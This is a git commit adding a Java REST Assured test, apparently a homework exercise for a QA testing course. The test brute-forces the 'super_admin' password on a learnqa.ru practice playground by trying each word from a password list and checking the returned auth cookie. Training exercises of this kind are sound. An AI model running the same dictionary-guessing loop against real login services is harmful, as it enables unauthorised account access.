c8eb9e8c6f7a374db67d9656b3c4733ace452684
OlgaVoronkina <voronkina.olga.s@gmail.com>
2022-10-16 01:20:01 +0300

    Ex9

---
+++ src/test/java/Ex_9.java
@@ -0,0 +1,64 @@
+import io.restassured.RestAssured;
+import io.restassured.response.Response;
+import org.junit.jupiter.api.Test;
+
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.*;
+
+
+
+public class Ex_9 {
+    @Test
+    public void ex9_draft() throws IOException {
+
+        Set uniquePasswords = this.getPasswords();
+        for(Object uniquePassword : uniquePasswords){
+        String answer = this.checkCookie((String) uniquePassword);
+            if(!answer.equals("You are NOT authorized")){
+                System.out.println("Верный пароль - "+uniquePassword);
+                break;
+            }
+        }
+    }
+
+    public Set getPasswords() throws IOException {
+        Path path = Paths.get("passwords");
+        ArrayList<String> passwords = new ArrayList<>(Files.readAllLines(path));
+        Set<String> uniquePass = new HashSet<>(passwords);
+        return uniquePass;
+    }
+
+    public String checkCookie(String uniquePassword) {
+        Map<String, String> cookie = getCookie(uniquePassword);
+        Response responseForCheck = RestAssured
+                .given()
+                .cookies(cookie)
+                .when()
+                .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                .andReturn();
+
+        String answer = responseForCheck.print();
+        return answer;
+    }
+
+    public Map getCookie(String uniquePassword) {
+        Map<String, String> body = new HashMap<>();
+        body.put("login", "super_admin");
+        body.put("password", uniquePassword);
+        Response response = RestAssured
+                .given()
+                .body(body)
+                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                .andReturn();
+
+        String responseCookies = response.getCookie("auth_cookie");
+        Map<String, String> cookies = new HashMap<>();
+        if (responseCookies!=null){
+            cookies.put("auth_cookie", responseCookies);
+        }
+        return cookies;
+    }
+}
